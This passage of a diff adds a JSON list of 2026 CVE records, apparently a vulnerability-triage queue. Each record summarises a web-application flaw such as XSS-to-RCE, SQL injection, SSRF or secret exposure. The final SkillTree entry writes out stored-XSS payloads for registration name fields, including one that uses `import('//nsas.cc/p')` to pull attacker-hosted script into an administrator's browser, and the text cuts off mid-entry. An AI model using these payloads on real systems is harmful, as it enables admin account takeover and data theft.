@@ -1,0 +1,1251 @@
+[
+ {
+  "advisory_refs": [
+   "https://github.com/vrana/adminer/security/advisories/GHSA-7c5h-q78c-fpxx",
+   "https://github.com/vrana/adminer/security/advisories/GHSA-7c5h-q78c-fpxx"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-100695",
+  "description": "Adminer before 6.0.2 contains a cross-site scripting vulnerability where the CONNECTION_ID() database result is interpolated into JavaScript without proper escaping, allowing a malicious database server to execute arbitrary JavaScript in the authenticated Adminer origin. In co-located deployments where the database has FILE privileges and can write to the webroot, attackers can use the XSS to submit authenticated SQL requests that write PHP files via INTO DUMPFILE, achieving remote code execution as the web server account.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 30,
+  "product": "adminer",
+  "published": "2026-09-26T14:16:54.297",
+  "references": [
+   "https://github.com/vrana/adminer/security/advisories/GHSA-7c5h-q78c-fpxx",
+   "https://www.vulncheck.com/advisories/adminer-before-6.0.2-xss-via-connection-id-escalating-to-rce"
+  ],
+  "vendor": "vrana"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/heymrun/heym/security/advisories/GHSA-6x65-w7q7-wg93"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-100862",
+  "description": "heym, a workflow automation platform, stores and returns multiple capability secrets in plaintext in versions prior to 0.0.91. Affected secrets include webhook header-auth values (returned in cleartext by GET /api/workflows/{id} and persisted unsanitized into execution history), MCP API keys (stored as a plaintext column, returned in config/list responses, and accepted via the ?key= query string so they leak into logs, proxies and Referer headers), portal session tokens (stored and validated by plaintext equality with a 168-hour TTL), workflow execution JWTs (stored in full and re-listed by GET .../execution-tokens), Discord interaction tokens (the full interaction body is stored in execution history), and global variables. A user with read access to a workflow, share/team membership, or anyone able to read the database, a backup, or logs can recover these secrets and replay them to execute workflows or act as the secret owner.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "heym",
+  "published": "2026-09-27T02:17:25.963",
+  "references": [
+   "https://github.com/heymrun/heym/security/advisories/GHSA-6x65-w7q7-wg93",
+   "https://www.vulncheck.com/advisories/heym-before-0.0.91-multiple-secrets-plaintext-storage"
+  ],
+  "vendor": "heymrun"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/TryGhost/Ghost/security/advisories/GHSA-5685-hwm9-62cg"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-103280",
+  "description": "Ghost from version 0.8.0 before 6.23.0 contains an information disclosure vulnerability in its setup endpoint: the endpoint responds to unauthenticated requests with the site owner's email address, allowing any remote visitor to obtain it.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "Ghost",
+  "published": "2026-10-01T11:17:23.907",
+  "references": [
+   "https://github.com/TryGhost/Ghost/security/advisories/GHSA-5685-hwm9-62cg",
+   "https://www.vulncheck.com/advisories/ghost-0.8.0-before-6.23.0-information-disclosure-via-setup-endpoint"
+  ],
+  "vendor": "TryGhost"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-894w-63wr-8x5r"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-104444",
+  "description": "YesWiki before 4.6.7 contains an authorization bypass vulnerability in the comments API editComment route that allows authenticated low-privilege users to overwrite arbitrary pages or comments by supplying their own page as the pagetag field. Attackers can send a POST request to the api/comments endpoint targeting a victim tag, bypassing per-page write ACLs to replace content and reparent existing pages or comments.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "yeswiki",
+  "published": "2026-10-02T12:17:15.490",
+  "references": [
+   "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-894w-63wr-8x5r",
+   "https://www.vulncheck.com/advisories/yeswiki-before-4.6.7-authorization-bypass-via-comments-api-editcomment"
+  ],
+  "vendor": "YesWiki"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/hotspotbilling/phpnuxbill/security/advisories/GHSA-q8ch-r8cv-q579",
+   "https://github.com/hotspotbilling/phpnuxbill/security/advisories/GHSA-q8ch-r8cv-q579"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-108107",
+  "description": "PHPNuxBill through 2025.3.20 contains an unauthenticated SQL injection vulnerability in the radius.php FreeRADIUS REST endpoint that interpolates request parameters into whereRaw() queries. Attackers can send crafted username, macAddr or nasid parameters to the accounting or authenticate actions to extract customer records and credentials via time-based blind SQL injection.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "sql_injection"
+  ],
+  "priority": 30,
+  "product": "phpnuxbill",
+  "published": "2026-10-09T15:17:11.713",
+  "references": [
+   "https://github.com/hotspotbilling/phpnuxbill",
+   "https://github.com/hotspotbilling/phpnuxbill/blob/2025.3.13/radius.php#L277",
+   "https://github.com/hotspotbilling/phpnuxbill/security/advisories/GHSA-q8ch-r8cv-q579",
+   "https://www.vulncheck.com/advisories/phpnuxbill-through-2025.3.20-unauthenticated-sql-injection-via-radius-php"
+  ],
+  "vendor": "hotspotbilling"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/opf/openproject/security/advisories/GHSA-w422-xf8f-v4vp"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:openproject:openproject:*:*:*:*:*:*:*:*",
+   "cpe:2.3:a:openproject:openproject:17.0.0:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-23646",
+  "description": "OpenProject is an open-source, web-based project management software. Users of OpenProject versions prior to 16.6.5 and 17.0.1 have the ability to view and end their active sessions via Account Settings → Sessions. When deleting a session, it was not properly checked if the session belongs to the user. As the ID that is used to identify these session objects use incremental integers, users could iterate requests using `DELETE /my/sessions/:id` and thus unauthenticate other users. Users did not have access to any sensitive information (like browser identifier, IP addresses, etc) of other users that are stored in the session. The problem was patched in OpenProject versions 16.6.5 and 17.0.1. No known workarounds are available as this does not require any permissions or other that can temporarily be disabled.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "openproject",
+  "published": "2026-01-19T18:16:05.587",
+  "references": [
+   "https://github.com/opf/openproject/releases/tag/v16.6.5",
+   "https://github.com/opf/openproject/releases/tag/v17.0.1",
+   "https://github.com/opf/openproject/security/advisories/GHSA-w422-xf8f-v4vp"
+  ],
+  "vendor": "opf"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/lobehub/lobe-chat/security/advisories/GHSA-4gpc-rhpj-9443"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-23733",
+  "description": "LobeChat is an open source chat application platform. Prior to version 2.0.0-next.180, a stored Cross-Site Scripting (XSS) vulnerability in the Mermaid artifact renderer allows attackers to execute arbitrary JavaScript within the application context. This XSS can be escalated to Remote Code Execution (RCE) by leveraging the exposed `electronAPI` IPC bridge, allowing attackers to run arbitrary system commands on the victim's machine. Version 2.0.0-next.180 patches the issue.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 30,
+  "product": "lobe-chat",
+  "published": "2026-01-18T23:15:48.710",
+  "references": [
+   "https://github.com/lobehub/lobe-chat/security/advisories/GHSA-4gpc-rhpj-9443"
+  ],
+  "vendor": "lobehub"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/mastodon/mastodon/security/advisories/GHSA-f3q8-7vw3-69v4"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:joinmastodon:mastodon:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-23964",
+  "description": "Mastodon is a free, open-source social network server based on ActivityPub. Prior to versions 4.5.5, 4.4.12, and 4.3.18, an insecure direct object reference in the web push subscription update endpoint lets any authenticated user update another user's push subscription by guessing or obtaining the numeric subscription id. This can be used to disrupt push notifications for other users and also leaks the web push subscription endpoint. Any user with a web push subscription is impacted, because another authenticated user can tamper with their push subscription settings if they can guess or obtain the subscription id. This allows an attacker to disrupt push notifications by changing the policy (whether to filter notifications from non-followers or non-followed users) and subscribed notification types of their victims. Additionally, the endpoint returns the subscription object, which includes the push notification endpoint for this subscription, but not its keypair. Mastodon versions v4.5.5, v4.4.12, v4.3.18 are patched.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "mastodon",
+  "published": "2026-01-22T03:15:46.700",
+  "references": [
+   "https://github.com/mastodon/mastodon/releases/tag/v4.3.18",
+   "https://github.com/mastodon/mastodon/releases/tag/v4.4.12",
+   "https://github.com/mastodon/mastodon/releases/tag/v4.5.5",
+   "https://github.com/mastodon/mastodon/security/advisories/GHSA-f3q8-7vw3-69v4"
+  ],
+  "vendor": "mastodon"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/horilla-opensource/horilla/security/advisories/GHSA-99mq-mhwv-w9qx"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:horilla:horilla:1.4.0:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-24039",
+  "description": "Horilla is a free and open source Human Resource Management System (HRMS). Version 1.4.0 has Improper Access Control, allowing low-privileged employees to self-approve documents they have uploaded. The document-approval UI is intended to be restricted to administrator or high-privilege roles only; however, an insufficient server-side authorization check on the approval endpoint lets a standard employee modify the approval status of their own uploaded document. A successful exploitation allows users with only employee-level permissions to alter application state reserved for administrators. This undermines the integrity of HR processes (for example, acceptance of credentials, certifications, or supporting materials), and may enable submission of unvetted documents. This issue is fixed in version 1.5.0.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "horilla",
+  "published": "2026-01-22T04:16:00.033",
+  "references": [
+   "https://github.com/horilla-opensource/horilla/releases/tag/1.5.0",
+   "https://github.com/horilla-opensource/horilla/security/advisories/GHSA-99mq-mhwv-w9qx"
+  ],
+  "vendor": "horilla-opensource"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/Squidex/squidex/security/advisories/GHSA-wxg2-953m-fg2w"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:squidex.io:squidex:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-24736",
+  "description": "Squidex is an open source headless content management system and content management hub. Versions of the application up to and including 7.21.0 allow users to define \"Webhooks\" as actions within the Rules engine. The url parameter in the webhook configuration does not appear to validate or restrict destination IP addresses. It accepts local addresses such as 127.0.0.1 or localhost. When a rule is triggered (Either manual trigger by manually calling the trigger endpoint or by a content update or any other triggers), the backend server executes an HTTP request to the user-supplied URL. Crucially, the server logs the full HTTP response in the rule execution log (lastDump field), which is accessible via the API. Which turns a \"Blind\" SSRF into a \"Full Read\" SSRF. As of time of publication, no patched versions are available.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 30,
+  "product": "squidex",
+  "published": "2026-01-27T21:16:02.967",
+  "references": [
+   "https://github.com/Squidex/squidex/security/advisories/GHSA-wxg2-953m-fg2w"
+  ],
+  "vendor": "Squidex"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/payloadcms/payload/security/advisories/GHSA-xx6w-jxg9-2wh8"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:payloadcms:payload:*:*:*:*:*:node.js:*:*"
+  ],
+  "cve_id": "CVE-2026-25544",
+  "description": "Payload is a free and open source headless content management system. Prior to 3.73.0, when querying JSON or richText fields, user input was directly embedded into SQL without escaping, enabling blind SQL injection attacks. An unauthenticated attacker could extract sensitive data (emails, password reset tokens) and achieve full account takeover without password cracking. This vulnerability is fixed in 3.73.0.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "sql_injection"
+  ],
+  "priority": 30,
+  "product": "payload",
+  "published": "2026-02-06T22:16:11.597",
+  "references": [
+   "https://github.com/payloadcms/payload/security/advisories/GHSA-xx6w-jxg9-2wh8"
+  ],
+  "vendor": "payloadcms"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-cccp-94vg-j92r"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:sillytavern:sillytavern:*:*:*:*:*:node.js:*:*"
+  ],
+  "cve_id": "CVE-2026-26286",
+  "description": "SillyTavern is a locally installed user interface that allows users to interact with text generation large language models, image generation engines, and text-to-speech voice models. In versions prior to 1.16.0, a Server-Side Request Forgery (SSRF) vulnerability in the asset download endpoint allows authenticated users to make arbitrary HTTP requests from the server and read the full response body, enabling access to internal services, cloud metadata, and private network resources. The vulnerability has been patched in the version 1.16.0 by introducing a whitelist domain check for asset download requests. It can be reviewed and customized by editing the `whitelistImportDomains` array in the `config.yaml` file.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 30,
+  "product": "SillyTavern",
+  "published": "2026-02-19T21:18:31.670",
+  "references": [
+   "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-cccp-94vg-j92r"
+  ],
+  "vendor": "SillyTavern"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/metabase/metabase/security/advisories/GHSA-vcj8-rcm8-gfj9"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:metabase:metabase:*:*:*:*:-:*:*:*",
+   "cpe:2.3:a:metabase:metabase:*:*:*:*:enterprise:*:*:*"
+  ],
+  "cve_id": "CVE-2026-27464",
+  "description": "Metabase is an open-source data analytics platform. In versions prior to 0.57.13 and versions 0.58.x through 0.58.6, authenticated users are able to retrieve sensitive information from a Metabase instance, including database access credentials. During testing, it was confirmed that a low-privileged user can extract sensitive information including database credentials, into the email body via template evaluation. This issue has been fixed in versions 0.57.13 and 0.58.7. To workaround this issue, users can disable notifications in their Metabase instance to disallow access to the vulnerable endpoints.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "metabase",
+  "published": "2026-02-21T08:16:10.553",
+  "references": [
+   "https://github.com/metabase/metabase/releases/tag/v0.57.13",
+   "https://github.com/metabase/metabase/releases/tag/v0.58.7",
+   "https://github.com/metabase/metabase/security/advisories/GHSA-vcj8-rcm8-gfj9"
+  ],
+  "vendor": "metabase"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-5m5g-q2vv-rv3r"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:wegia:wegia:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-28409",
+  "description": "WeGIA is a web manager for charitable institutions. Prior to version 3.6.5, a critical Remote Code Execution (RCE) vulnerability exists in the WeGIA application's database restoration functionality. An attacker with administrative access (which can be obtained via the previously reported Authentication Bypass) can execute arbitrary OS commands on the server by uploading a backup file with a specifically crafted filename. Version 3.6.5 fixes the issue.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "command_injection",
+   "code_execution",
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "WeGIA",
+  "published": "2026-02-27T22:16:24.010",
+  "references": [
+   "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-5m5g-q2vv-rv3r"
+  ],
+  "vendor": "LabRedesCefetRJ"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h",
+   "https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:openwebui:open_webui:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-28786",
+  "description": "Open WebUI is a self-hosted artificial intelligence platform designed to operate entirely offline. Prior to version 0.8.6, an unsanitized filename field in the speech-to-text transcription endpoint allows any authenticated non-admin user to trigger a `FileNotFoundError` whose message — including the server's absolute `DATA_DIR` path — is returned verbatim in the HTTP 400 response body, confirming information disclosure on all default deployments. Version 0.8.6 patches the issue.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "open-webui",
+  "published": "2026-03-27T00:16:22.503",
+  "references": [
+   "https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h"
+  ],
+  "vendor": "open-webui"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/opf/openproject/security/advisories/GHSA-9wr7-j98g-2jh3"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:openproject:openproject:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-31974",
+  "description": "OpenProject is an open-source, web-based project management software. Prior to 17.2.0, OpenProject SMTP test endpoint (POST /admin/settings/mail_notifications) accepts arbitrary host and port values and exhibits measurable differences in response behaviour depending on whether the target IP exists and whether the port is open. An attacker with access can use these timing and error distinctions to map internal hosts and identify which services/ports are reachable. Similarly, you can create webhooks in OpenProject and point them to arbitrary IPs, resulting in the same kind of SSRF issue which allows attackers to scan the internal network. This vulnerability is fixed in 17.2.0.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 30,
+  "product": "openproject",
+  "published": "2026-03-11T20:16:17.280",
+  "references": [
+   "https://github.com/opf/openproject/security/advisories/GHSA-9wr7-j98g-2jh3"
+  ],
+  "vendor": "opf"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m468-xcm6-fxg4"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:nginxui:nginx_ui:*:*:*:*:*:*:*:*",
+   "cpe:2.3:a:uozi:cosy:*:*:*:*:*:go:*:*"
+  ],
+  "cve_id": "CVE-2026-33028",
+  "description": "Nginx UI is a web user interface for the Nginx web server. Prior to version 2.3.4, the nginx-ui application is vulnerable to a Race Condition. Due to the complete absence of synchronization mechanisms (Mutex) and non-atomic file writes, concurrent requests lead to the severe corruption of the primary configuration file (app.ini). This vulnerability results in a persistent Denial of Service (DoS) and introduces a non-deterministic path for Remote Code Execution (RCE) through configuration cross-contamination. This issue has been patched in version 2.3.4.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 30,
+  "product": "nginx-ui",
+  "published": "2026-03-30T18:16:18.947",
+  "references": [
+   "https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4",
+   "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-m468-xcm6-fxg4"
+  ],
+  "vendor": "0xJacky"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/pinchtab/pinchtab/security/advisories/GHSA-mrqc-3276-74f8",
+   "https://github.com/pinchtab/pinchtab/security/advisories/GHSA-mrqc-3276-74f8"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:pinchtab:pinchtab:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-33620",
+  "description": "PinchTab is a standalone HTTP server that gives AI agents direct control over a Chrome browser. PinchTab `v0.7.8` through `v0.8.3` accepted the API token from a `token` URL query parameter in addition to the `Authorization` header. When a valid API credential is sent in the URL, it can be exposed through request URIs recorded by intermediaries or client-side tooling, such as reverse proxy access logs, browser history, shell history, clipboard history, and tracing systems that capture full URLs. This issue is an unsafe credential transport pattern rather than a direct authentication bypass. It only affects deployments where a token is configured and a client actually uses the query-parameter form. PinchTab's security guidance already recommended `Authorization: Bearer <token>`, but `v0.8.3` still accepted `?token=` and included first-party flows that generated and consumed URLs containing the token. This was addressed in v0.8.4 by removing query-string token authentication and requiring safer header- or session-based authentication flows.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "pinchtab",
+  "published": "2026-03-26T21:17:06.410",
+  "references": [
+   "https://github.com/pinchtab/pinchtab/releases/tag/v0.8.4",
+   "https://github.com/pinchtab/pinchtab/security/advisories/GHSA-mrqc-3276-74f8"
+  ],
+  "vendor": "pinchtab"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/devcode-it/openstamanager/security/advisories/GHSA-mmm5-3g4x-qw39",
+   "https://github.com/devcode-it/openstamanager/security/advisories/GHSA-mmm5-3g4x-qw39"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:devcode:openstamanager:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-35470",
+  "description": "OpenSTAManager is an open source management software for technical assistance and invoicing. Prior to 2.10.2, confronta_righe.php files across different modules in OpenSTAManager contain an SQL Injection vulnerability. The righe parameter received via $_GET['righe'] is directly concatenated into an SQL query without any sanitization, parameterization or validation. An authenticated attacker can inject arbitrary SQL statements to extract sensitive data from the database, including user credentials, customer information, invoice data and any other stored data. This vulnerability is fixed in 2.10.2.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "sql_injection"
+  ],
+  "priority": 30,
+  "product": "openstamanager",
+  "published": "2026-04-06T18:16:44.400",
+  "references": [
+   "https://github.com/devcode-it/openstamanager/releases/tag/v2.10.2",
+   "https://github.com/devcode-it/openstamanager/security/advisories/GHSA-mmm5-3g4x-qw39"
+  ],
+  "vendor": "devcode-it"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/goauthentik/authentik/security/advisories/GHSA-hhpc-rqgm-pxj4"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-40166",
+  "description": "authentik is an open-source identity provider. In versions prior to 2025.12.5 and 2026.2.0-rc1 through 2026.2.2, authenticated non-admin users with at least one OAuth2 access token can retrieve the client_secret of confidential OAuth2 providers they have previously authenticated against, exposing sensitive information to users without the correct permissions. This logic is GET /api/v3/oauth2/access_tokens/. The API response includes a nested provider object containing client_id and client_secret for providers configured with client_type: confidential, which should not be accessible to low-privilege users. This issue has been fixed in versions 2025.12.5 and 2026.2.3.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "authentik",
+  "published": "2026-05-22T19:17:03.763",
+  "references": [
+   "https://github.com/goauthentik/authentik/releases/tag/version%2F2025.12.5",
+   "https://github.com/goauthentik/authentik/releases/tag/version%2F2026.2.3",
+   "https://github.com/goauthentik/authentik/security/advisories/GHSA-hhpc-rqgm-pxj4"
+  ],
+  "vendor": "goauthentik"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/labring/FastGPT/security/advisories/GHSA-gc8m-w37w-24hw"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:fastgpt:fastgpt:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-40252",
+  "description": "FastGPT is an AI Agent building platform. Prior to 4.14.10.4, Broken Access Control vulnerability (IDOR/BOLA) allows any authenticated team to access and execute applications belonging to other teams by supplying a foreign appId. While the API correctly validates the team token, it does not verify that the requested application belongs to the authenticated team. This leads to cross-tenant data exposure and unauthorized execution of private AI workflows. This vulnerability is fixed in 4.14.10.4.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "FastGPT",
+  "published": "2026-04-10T21:16:27.907",
+  "references": [
+   "https://github.com/labring/FastGPT/releases/tag/v4.14.10.4",
+   "https://github.com/labring/FastGPT/security/advisories/GHSA-gc8m-w37w-24hw"
+  ],
+  "vendor": "labring"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/Studio-42/elFinder/security/advisories/GHSA-c3gj-q88f-7hqj"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-44521",
+  "description": "elFinder is an open-source file manager for web, written in JavaScript using jQuery UI. Prior to 2.1.68, an authenticated SQL injection vulnerability in the elFinder MySQL volume driver (elFinderVolumeMySQL) allows any logged-in user, including users with read-only access to the affected volume, to inject SQL through a crafted target file hash. Successful exploitation can lead to unauthorized data disclosure and denial of service. This vulnerability only affects installations configured to use the MySQL volume driver. This vulnerability is fixed in 2.1.68.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "sql_injection"
+  ],
+  "priority": 30,
+  "product": "elFinder",
+  "published": "2026-05-27T18:16:23.953",
+  "references": [
+   "https://github.com/Studio-42/elFinder/security/advisories/GHSA-c3gj-q88f-7hqj"
+  ],
+  "vendor": "Studio-42"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/openclaw/openclaw/security/advisories/GHSA-rjxq-qqhf-8hwh"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:openclaw:openclaw:*:*:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta1:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta2:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta3:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta4:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta5:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta6:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta7:*:*:*:node.js:*:*",
+   "cpe:2.3:a:openclaw:openclaw:2026.5.12:beta8:*:*:*:node.js:*:*"
+  ],
+  "cve_id": "CVE-2026-53840",
+  "description": "OpenClaw before 2026.5.12 contains an information disclosure vulnerability in streamable-http MCP servers that forwards operator-configured custom headers during cross-origin redirects. Attackers controlling or compromising an MCP endpoint can redirect requests to exfiltrate sensitive headers like API keys or tenant-routing credentials to attacker-controlled origins.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 30,
+  "product": "OpenClaw",
+  "published": "2026-06-16T19:17:00.863",
+  "references": [
+   "https://github.com/openclaw/openclaw/security/advisories/GHSA-rjxq-qqhf-8hwh",
+   "https://www.vulncheck.com/advisories/openclaw-custom-header-leakage-via-mcp-streamable-http-cross-origin-redirects"
+  ],
+  "vendor": "OpenClaw"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8",
+   "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-54694",
+  "description": "SkillTree is a micro-learning gamification platform. Prior to version 4.4.2, two independent code flaws combine into a single exploitable attack chain, with three distinct exploitation paths of escalating impact. `StringHighlighter.js` builds an HTML string by interpolating raw `value` substrings directly into a template literal with no HTML entity encoding. `HighlightedValue.vue` renders that string — and all unfiltered plain values — via Vue's `v-html` directive, which sets `innerHTML`. Separately, the account registration endpoint accepts `firstName`, `lastName`, and `nickname` fields and stores them without any HTML sanitization. An attacker self-registers with `firstName = \"<img src=x onerror=alert(1)>\"` (28 characters — within the 30-character field limit) and visits any quiz. The next time an administrator opens the Quiz Runs page the payload executes in their browser. Three attack paths exist with escalating impact. The first is basic cross-site scripting. Any self-contained payload fitting the 30-character limit (e.g. `<img src=x onerror=alert(1)>`, which is 28 chars) fires automatically when the admin navigates to the runs page through normal use. Arbitrary code execution in the admin's browser is confirmed with zero extra steps. The second is remote script loading via `import()`. Using the split-field technique (`lastName = \"<img src=x\"`, `firstName = \"onerror=import('//nsas.cc/p')>\"`), the attacker loads a full JavaScript file from their server. The file has no size limit and can perform any admin action — delete all projects, create backdoor accounts, dump user data, install a keylogger. No phishing required. The only constraint is that the URL must fit in 11 characters (`//nsas.cc/p`). The third is full cross-site request forgery token theft. Using `eval(name)`, the 